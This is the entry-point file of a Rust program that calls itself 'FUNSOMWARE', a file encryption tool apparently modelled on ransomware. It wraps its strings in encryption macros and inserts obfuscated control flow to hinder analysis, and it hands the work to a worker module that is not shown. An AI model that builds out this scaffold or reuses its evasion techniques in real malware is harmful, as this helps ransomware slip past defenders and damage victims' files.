use cryptify::{encrypt_string, flow_stmt};

mod config;
mod crypto;
mod worker;

fn main() {
    // Add obfuscated control flow
    flow_stmt!();

    if config::SHOW_CLI {
        print_banner();
    }

    // Run the file processing worker
    match worker::run() {
        Ok(_) => {
            if config::SHOW_CLI {
                println!("\n{}", encrypt_string!("================================="));
                println!("{}", encrypt_string!("All operations completed successfully!"));
                println!("{}", encrypt_string!("================================="));
            }
        }
        Err(e) => {
            eprintln!("{} {}", encrypt_string!("Fatal error:"), e);
            std::process::exit(1);
        }
    }

    // Add more obfuscated control flow
    flow_stmt!();
}

fn print_banner() {
    flow_stmt!();
    
    println!("{}", encrypt_string!("================================="));
    println!("{}", encrypt_string!("   FUNSOMWARE v0.1.0"));
    println!("{}", encrypt_string!("   File Encryption Tool"));
    println!("{}", encrypt_string!("================================="));
    println!();
}
